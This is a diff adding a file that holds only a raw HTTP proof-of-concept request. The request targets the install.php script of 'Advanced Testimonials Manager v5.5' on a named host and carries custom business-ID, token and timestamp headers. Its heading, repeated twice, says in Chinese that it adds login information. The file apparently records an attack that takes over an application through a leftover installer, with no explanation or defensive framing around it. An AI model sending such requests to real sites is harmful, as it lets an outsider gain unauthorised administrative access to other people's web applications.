@@ -1,0 +1,9 @@
+# Advanced Testimonials Manager v5.5 添加登陆信息
+# Advanced Testimonials Manager v5.5 添加登陆信息
+GET /testimonials/install.php?acid=80001504&bid=hd_tag_m8mv26l4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26l4
+RM-PRO-Token: cd29fa94dfa63684dcaf5dd895ab860e
+RM-PRO-Time: 1742808629829
+User-Agent: curl/7.83.1
+
